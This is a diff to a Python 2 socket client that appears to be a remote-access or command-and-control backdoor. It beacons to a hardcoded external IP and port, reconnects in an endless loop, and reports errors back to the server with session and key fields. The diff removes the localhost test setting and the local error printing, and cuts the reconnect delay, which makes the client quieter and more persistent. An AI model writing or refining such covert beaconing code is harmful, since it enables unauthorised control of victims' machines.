@@ -1,3 +1,4 @@
+
 # -*- coding: utf-8 -*-
 # !/usr/bin/python
 
@@ -16,7 +17,6 @@ import datetime
 import zlib
 
 HOST = '109.172.189.74'
-#HOST = '127.0.0.1'
 PORT = 4434
 ACTIVE = False
 GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -44,12 +44,11 @@ while 1:
             # TODO: END SOURCE
 
         except Exception as e:
-            print e
             ACTIVE = False
             GLOBAL_SOCKET.sendall(str({'mode': 'buildClientError', 'from': 'client', 'payload': '%s' % e, 'key': '', 'session_id': ''})+'[ENDOFMESSAGE]')
             GLOBAL_SOCKET.close()
             del GLOBAL_SOCKET
             GLOBAL_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            time.sleep(60)
+            time.sleep(6)
     except socket.error:
         time.sleep(5)
